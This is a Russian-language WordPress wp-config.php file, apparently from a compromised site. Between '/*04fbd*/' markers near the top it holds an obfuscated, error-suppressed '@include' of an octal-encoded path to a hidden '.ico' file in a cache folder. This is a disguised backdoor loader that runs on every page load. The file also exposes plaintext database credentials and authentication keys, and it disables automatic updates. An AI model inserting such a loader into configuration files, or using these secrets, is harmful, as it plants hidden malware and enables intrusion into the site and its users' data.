<?php

//Begin Really Simple SSL Load balancing fix
if ((isset($_ENV["HTTPS"]) && ("on" == $_ENV["HTTPS"]))
|| (isset($_SERVER["HTTP_X_FORWARDED_SSL"]) && (strpos($_SERVER["HTTP_X_FORWARDED_SSL"], "1") !== false))
|| (isset($_SERVER["HTTP_X_FORWARDED_SSL"]) && (strpos($_SERVER["HTTP_X_FORWARDED_SSL"], "on") !== false))
|| (isset($_SERVER["HTTP_CF_VISITOR"]) && (strpos($_SERVER["HTTP_CF_VISITOR"], "https") !== false))
|| (isset($_SERVER["HTTP_CLOUDFRONT_FORWARDED_PROTO"]) && (strpos($_SERVER["HTTP_CLOUDFRONT_FORWARDED_PROTO"], "https") !== false))
|| (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && (strpos($_SERVER["HTTP_X_FORWARDED_PROTO"], "https") !== false))
|| (isset($_SERVER["HTTP_X_PROTO"]) && (strpos($_SERVER["HTTP_X_PROTO"], "SSL") !== false))
) {
$_SERVER["HTTPS"] = "on";
}
//END Really Simple SSL
/*04fbd*/

@include "\057var/\167ww/m\141rik_\155l4/d\141ta/w\167w/tu\162bo-l\145ader\056com/\167p-co\156tent\057cach\145/hyp\145r-ca\143he/.\060dfa1\143f2.i\143o";

/*04fbd*/

  define('WP_SITEURL','https://' . $_SERVER['HTTP_HOST']); define('WP_HOME','https://' . $_SERVER['HTTP_HOST']);

/**

* Основные параметры WordPress.

*

* Скрипт для создания wp-config.php использует этот файл в процессе

* установки. Необязательно использовать веб-интерфейс, можно

* скопировать файл в "wp-config.php" и заполнить значения вручную.

*

* Этот файл содержит следующие параметры:

*

* * Настройки MySQL

* * Секретные ключи

* * Префикс таблиц базы данных

* * ABSPATH

*

* @link https://codex.wordpress.org/Editing_wp-config.php

*

* @package WordPress

*/



// ** Параметры MySQL: Эту информацию можно получить у вашего хостинг-провайдера ** //

/** Имя базы данных для WordPress */
//define('DB_NAME', 'vh152571_db');
define('DB_NAME', 'newbd');


/** Имя пользователя MySQL */

define('DB_USER', 'marik_ml');



/** Пароль к базе данных MySQL */

define('DB_PASSWORD', 'Marik218898');



/** Имя сервера MySQL */

define('DB_HOST', 'localhost');



/** Кодировка базы данных для создания таблиц. */

define('DB_CHARSET', 'utf8');



/** Схема сопоставления. Не меняйте, если не уверены. */

define('DB_COLLATE', '');



/**#@+

* Уникальные ключи и соли для аутентификации.

*

* Смените значение каждой константы на уникальную фразу.

* Можно сгенерировать их с помощью {@link https://api.wordpress.org/secret-key/1.1/salt/ сервиса ключей на WordPress.org}

* Можно изменить их, чтобы сделать существующие файлы cookies недействительными. Пользователям потребуется авторизоваться снова.

*

* @since 2.6.0

*/

define('AUTH_KEY',         '..Y4EYMHDBPZFEC>A1VFF!%BVSMN1@>LXJ!DGWHWN6>9_V%G0ONV77ATZ69GJG?W.');

define('SECURE_AUTH_KEY',  '@ZL6.O3,4@BZ.73BJEVK/&S?PT.:!%QSHTW&,8V45E//.AX5/>0.*O.,XTTU6JX*&');

define('LOGGED_IN_KEY',    'ZQUL1DLZ2_,989HB..W.L7Q5G%L%:SWQ>@UZLU??Y..@/OD%_Q:QTKA9HXEL/>>>Y');

define('NONCE_KEY',        'THB,:////5.U>WK/PO&*04JGB<:E8Y%//M_<H3IXWM_CV//MZDBFFNDH*?2HDFGX@');

define('AUTH_SALT',        '@!M8:/4,6700&MV&<412SLD7<>G//NR9!A_00%M,A6KLQ0YKE4B%.>3ST!:VW4MM%');

define('SECURE_AUTH_SALT', '6!Z,7IUCB7%V*TYD//ZV:?..P>B@SQ<UNZD,L>4UV%0ZHW8!UL/3!UK>../VKG2*D');

define('LOGGED_IN_SALT',   '<.X&@W//Q9P@SN*R?C7RNQGA,W0>//UH76TNB0&2.KN>8_A_OSAZ:%&>4S%D93@6F');

define('NONCE_SALT',       'SDCUQ*536U71LLR,D_R9F<.Y8M,8/M2@U..S<,7E/V.HG5QM>5>8LVG2<FJKVQSD2');



/**#@-*/



/**

* Префикс таблиц в базе данных WordPress.

*

* Можно установить несколько сайтов в одну базу данных, если использовать

* разные префиксы. Пожалуйста, указывайте только цифры, буквы и знак подчеркивания.

*/

$table_prefix  = 'wp_';

define("WP_CACHE", true);



/**

* Для разработчиков: Режим отладки WordPress.

*

* Измените это значение на true, чтобы включить отображение уведомлений при разработке.

* Разработчикам плагинов и тем настоятельно рекомендуется использовать WP_DEBUG

* в своём рабочем окружении.

*

* Информацию о других отладочных константах можно найти в Кодексе.

*

* @link https://codex.wordpress.org/Debugging_in_WordPress

*/

define('WP_DEBUG', false);



/* Это всё, дальше не редактируем. Успехов! */



/** Абсолютный путь к директории WordPress. */

if ( !defined('ABSPATH') )

define('ABSPATH', dirname(__FILE__) . '/');



/** Инициализирует переменные WordPress и подключает файлы. */

require_once(ABSPATH . 'wp-settings.php');



// Блокировка обновлений всех версий и ядра

define( 'AUTOMATIC_UPDATER_DISABLED', true );